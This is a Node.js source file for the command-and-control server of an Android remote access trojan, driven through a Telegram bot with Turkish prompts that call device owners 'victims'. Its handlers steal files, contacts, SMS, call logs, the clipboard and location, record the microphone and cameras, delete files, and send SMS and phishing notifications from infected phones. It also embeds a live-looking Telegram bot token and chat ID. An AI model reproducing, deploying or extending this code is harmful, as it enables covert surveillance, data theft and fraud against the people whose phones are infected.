const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '7630420490:AAF37_JUWOargHWjSoNoWVBo2E04N_BiwVA'
const id = '5428867320'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">Merhaba! bot başarıyla başlatıldı. Geliştirici: @datasatis</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• mesaj gönderen<b>${req.headers.model}</b> Title`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• mesaj gönderen<b>${req.headers.model}</b> cihaz\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• konumu <b>${req.headers.model}</b> Title`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• cihaz yeni çevrimiçi\n\n` +
        `• Cihaz modeli : <b>${model}</b>\n` +
        `• pil : <b>${battery}</b>\n` +
        `• Android sistemi : <b>${version}</b>\n` +
        `• Ekran parlaklığı : <b>${brightness}</b>\n` +
        `• sağlayıcı : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• Bağlı cihaz yok\n\n` +
            `• Cihaz modeli : <b>${model}</b>\n` +
            `• pil : <b>${battery}</b>\n` +
            `• Android sistemi : <b>${version}</b>\n` +
            `• Ekran parlaklığı : <b>${brightness}</b>\n` +
            `• sağlayıcı : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• Lütfen mağdurun numarasından göndermek istediğiniz numarayı yazınız')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• Tamam, şimdi kurbanın cihazından göndermek istediğin mesajı biraz önce yazdığın numaraya yaz...\n\n' +
                '• Mesajınızdaki karakter sayısı izin verilen sınırı aştığında mesajın gönderilmeyeceğine dikkat edin ،',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• Tamam, şimdi kurbanın cihazından göndermek istediğin mesajı biraz önce yazdığın numaraya yaz...')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Talebiniz işleme alınıyor, lütfen bekleyin...\n\n' +
                '• Önümüzdeki birkaç dakika içinde bir yanıt alacaksınız Geliştirici: @datasatis ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["bilgi"], ["kontrol"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Lütfen herkese göndermek istediğiniz mesajı yazın')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Talebiniz işleme alınıyor, lütfen bekleyin...\n\n' +
                '• Önümüzdeki birkaç dakika içinde bir yanıt alacaksınız Geliştirici:  @datasatis ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["bilgi"], ["kontrol"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Kurbanın cihazından çıkarmak istediğiniz dosyanın yolunu girin')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Talebiniz işleme alınıyor, lütfen bekleyin...\n\n' +
                '• Önümüzdeki birkaç dakika içinde bir yanıt alacaksınız Geliştirici:  @datasatis ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["bilgi"], ["kontrol"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• İstediğiniz dosyanın yolunu girin ')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Talebiniz işleme alınıyor, lütfen bekleyin...\n\n' +
                '• Önümüzdeki birkaç dakika içinde bir yanıt alacaksınız Geliştirici:  @datasatis ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["bilgi"], ["kontrol"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Kurbanın sesini kaydetmek istediğiniz süreyi girin')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Talebiniz işleme alınıyor, lütfen bekleyin...\n\n' +
                '• Önümüzdeki birkaç dakika içinde bir yanıt alacaksınız Geliştirici:  @datasatis ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["bilgi"], ["kontrol"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Ön kameranın kaydetmesini istediğiniz süreyi girin')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Talebiniz işleme alınıyor, lütfen bekleyin...\n\n' +
                '• Önümüzdeki birkaç dakika içinde bir yanıt alacaksınız Geliştirici:  @datasatis ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["bilgi"], ["kontrol"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Kurbanın selfie kamerasının kaydetmesini istediğiniz süreyi girin')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Talebiniz işleme alınıyor, lütfen bekleyin...\n\n' +
                '• • Önümüzdeki birkaç dakika içinde bir yanıt alacaksınız Geliştirici:  @datasatis ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["bilgi"], ["kontrol"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Kurbanın cihazında görünmesini istediğiniz mesajı girin')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Talebiniz işleme alınıyor, lütfen bekleyin...\n\n' +
                '• Önümüzdeki birkaç dakika içinde bir yanıt alacaksınız Geliştirici:  @datasatis ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["bilgi"], ["kontrol"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Bildirim olarak görünmesini istediğiniz mesajı girin')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '°• Harika, şimdi bildirimle birlikte açmak istediğiniz bağlantıyı girin\n\n' +
                '• Mağdur bildirime tıkladığında girdiğiniz bağlantı açılacaktır ،',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• Harika, şimdi bildirimle birlikte açmak istediğiniz bağlantıyı girin')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Talebiniz işleme alınıyor, lütfen bekleyin...\n\n' +
                '• Önümüzdeki birkaç dakika içinde bir yanıt alacaksınız Geliştirici:  @datasatis ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["bilgi"], ["kontrol"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Çalmak istediğiniz sesin bağlantısını girin')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Talebiniz işleme alınıyor, lütfen bekleyin...\n\n' +
                '• Önümüzdeki birkaç dakika içinde bir yanıt alacaksınız Geliştirici:  @datasatis ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["bilgi"], ["kontrol"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '• merhaba! Bot başarıyla başlatıldı. geliştirici: @datasatis\n\n' +
                '• Uygulama hedef cihazda yüklüyse bağlantıyı bekleyin\n\n' +
                '• Bağlantı mesajını aldığınızda hedef cihazın bağlı olduğu ve komut almaya hazır olduğu anlamına gelir.\n\n' +
                '• Kontrol paneline tıklayın ve istediğiniz cihazı seçin ardından komutlar arasında istediğiniz komutu seçin.\n\n' +
                '• Botta bir yerde takılıp kalırsanız /start komutunu gönderin ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["bilgi"], ["kontrol"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == 'bilgi') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• Bağlı ve kullanılabilir cihaz yok\n\n' +
                    '• Uygulamanın hedef cihaza yüklendiğinden emin olun'
                )
            } else {
                let text = '°• Bağlı cihazların listesi :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• Cihaz modeli : <b>${value.model}</b>\n` +
                        `• Pil : <b>${value.battery}</b>\n` +
                        `• Android sistemi : <b>${value.version}</b>\n` +
                        `• Ekran parlaklığı : <b>${value.brightness}</b>\n` +
                        `• sağlayıcı : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == 'kontrol') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• Bağlı ve kullanılabilir cihaz yok\n\n' +
                    '• Uygulamanın hedef cihaza yüklendiğinden emin olun'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• Komutları yürütmek istediğiniz cihazı seçin', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• İzin isteği reddedildi')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• Cihaz için Övgüyü seçin : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'Uygulamalar', callback_data: `apps:${uuid}`},
                        {text: 'Cihaz bilgileri', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: 'Tüm dosyaları al', callback_data: `file:${uuid}`},
                        {text: 'Bir dosyayı silme', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: 'Pano', callback_data: `clipboard:${uuid}`},
                        {text: 'ses kaydedici', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'Arka kamera', callback_data: `camera_main:${uuid}`},
                        {text: 'Selfie kamerası', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'site', callback_data: `location:${uuid}`},
                        {text: 'bildirim mesajı', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: 'Aramalar', callback_data: `calls:${uuid}`},
                        {text: 'Kişiler', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: 'Titreşim', callback_data: `vibrate:${uuid}`},
                        {text: 'Tehlikeleri göster', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: 'Mesajlar', callback_data: `messages:${uuid}`},
                        {text: 'Mesaj gönder', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: 'Bir ses dosyasını oynat', callback_data: `play_audio:${uuid}`},
                        {text: 'Ses dosyasını durdur', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: 'Tüm kişilere mesaj gönder',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Talebiniz işleme alınıyor, lütfen bekleyin...\n\n' +
            '• Önümüzdeki birkaç dakika içinde bir yanıt alacaksınız Geliştirici:  @datasatis ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["bilgi"], ["kontrol"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Talebiniz işleme alınıyor, lütfen bekleyin...\n\n' +
            '• Önümüzdeki birkaç dakika içinde bir yanıt alacaksınız Geliştirici:  @datasatis ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["bilgi"], ["kontrol"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Talebiniz işleme alınıyor, lütfen bekleyin...\n\n' +
            '• Önümüzdeki birkaç dakika içinde bir yanıt alacaksınız Geliştirici:  @datasatis ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["bilgi"], ["kontrol"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Talebiniz işleme alınıyor, lütfen bekleyin...\n\n' +
            '• Önümüzdeki birkaç dakika içinde bir yanıt alacaksınız Geliştirici:  @datasatis ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["bilgi"], ["kontrol"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Talebiniz işleme alınıyor, lütfen bekleyin...\n\n' +
            '• Önümüzdeki birkaç dakika içinde bir yanıt alacaksınız Geliştirici:  @datasatis ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["bilgi"], ["kontrol"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Talebiniz işleme alınıyor, lütfen bekleyin...\n\n' +
            '• Önümüzdeki birkaç dakika içinde bir yanıt alacaksınız Geliştirici:  @datasatis ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["bilgi"], ["kontrol"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Talebiniz işleme alınıyor, lütfen bekleyin...\n\n' +
            '• Önümüzdeki birkaç dakika içinde bir yanıt alacaksınız Geliştirici:  @datasatis ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["bilgi"], ["kontrol"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Talebiniz işleme alınıyor, lütfen bekleyin...\n\n' +
            '• Önümüzdeki birkaç dakika içinde bir yanıt alacaksınız Geliştirici:  @datasatis ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["bilgi"], ["kontrol"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Talebiniz işleme alınıyor, lütfen bekleyin...\n\n' +
            '• Önümüzdeki birkaç dakika içinde bir yanıt alacaksınız Geliştirici: @datasatis ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["bilgi"], ["kontrol"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Talebiniz işleme alınıyor, lütfen bekleyin...\n\n' +
            '• Önümüzdeki birkaç dakika içinde bir yanıt alacaksınız Geliştirici: @datasatis ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["bilgi"], ["kontrol"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Talebiniz işleme alınıyor, lütfen bekleyin...\n\n' +
            '• Önümüzdeki birkaç dakika içinde bir yanıt alacaksınız Geliştirici: @datasatis ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["cihazlar"], ["kontrol"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Lütfen mağdurun numarasından göndermek istediğiniz numarayı yazınız\n\n' +
            '• Yerel ülke numaralarına SMS göndermek istiyorsanız numaranın başına sıfır koyarak girebilirsiniz, aksi takdirde numarayı ülke koduyla birlikte girebilirsiniz,',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Lütfen herkese göndermek istediğiniz mesajı yazın\n\n' +
            '• Mesajınızdaki karakter sayısı izin verilenden fazla ise mesajın gönderilmeyeceğine dikkat edinه ،',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Kurbanın cihazından çıkarmak istediğiniz dosyanın yolunu girin\n\n' +
            '• Tam dosya yolunu girmenize gerek yoktur, sadece ana yolu girmeniz yeterlidir. Örneğin, girin<b> DCIM/Camera </b> Galeri dosyalarını almak için.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• İstediğiniz dosyanın yolunu girin \n\n' +
            '• Tam dosya yolunu girmenize gerek yoktur, sadece ana yolu girmeniz yeterlidir. Örneğin, girin<b> DCIM/Camera </b> Galeri dosyalarını silmek için.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• İstediğiniz dosyanın yolunu girin \n\n' +
            '• Sürenin saniye cinsinden sayısal olarak girilmesi gerektiğini unutmayın. ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Kurbanın cihazında görünmesini istediğiniz mesajı girin\n\n' +
            '• Cihaz ekranında birkaç saniye boyunca görünen kısa bir mesajdır. ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• Bildirim olarak görünmesini istediğiniz mesajı girin\n\n' +
            '• Mesajınız hedef cihazın durum çubuğunda normal bir bildirim gibi görünecek ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• °• Çalmak istediğiniz sesin bağlantısını girin\n\n' +
            '• İstediğiniz sesin doğrudan bağlantısını girmeniz gerektiğini unutmayın, aksi takdirde ses çalınmayacaktır ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);
